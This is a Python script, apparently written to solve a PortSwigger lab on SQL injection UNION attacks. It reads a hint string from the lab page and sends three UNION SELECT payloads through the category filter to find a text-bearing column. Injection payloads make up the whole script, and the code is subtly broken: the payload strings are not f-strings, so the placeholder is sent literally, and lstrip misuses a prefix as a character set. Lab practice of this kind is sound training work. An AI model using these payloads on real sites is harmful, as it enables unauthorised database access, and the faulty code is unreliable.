"""
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.status_code)

s = requests.Session()

url= f'https://{site}/'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
hint_text = soup.find(id='hint').get_text().split("'")[1]
print(f"Database needs to retrieve the string {hint_text}")

try_category("""Gifts' UNION SELECT '{hint_text}',null,null -- """)
try_category("""Gifts' UNION SELECT null,'{hint_text}',null -- """)
try_category("""Gifts' UNION SELECT null,null,'{hint_text}' -- """)